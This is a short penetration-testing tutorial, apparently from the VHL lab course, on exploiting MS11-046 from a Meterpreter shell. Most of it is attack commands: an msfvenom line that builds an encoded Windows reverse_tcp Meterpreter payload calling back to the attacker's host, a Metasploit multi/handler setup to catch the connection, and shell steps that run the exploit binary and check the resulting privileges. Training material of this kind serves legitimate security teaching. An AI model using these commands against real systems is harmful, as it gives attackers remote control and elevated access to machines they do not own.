
--- Exploiting MS11-046 from a Meterpreter shell ---

Note: On a real penetration test or the VHL Lab network we would first exploit a vulnerability to allow us to upload files to the target host and to execute them. For this tutorial we assume that we have already exploited such a vulnerability and have command execution on the target which allows us to upload files and execute them.

msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=[IP attackbox] LPORT=4444 -e x86/shikata_ga_nai –f exe –o exploit.exe

msfconsole
use exploit/multi/handler
set lhost [IP attackbox]
set lport 4444
run

Then download the exploit to the target host and execute it. If everything was setup correctly you should receive a reverse Meterpreter shell on the msfconsole.
Next type shell on the Meterpreter command line to create the reverse shell.

meterpreter> shell
C:\Users\test\Desktop> explit.exe
C:\Users\test\Desktop> whoami
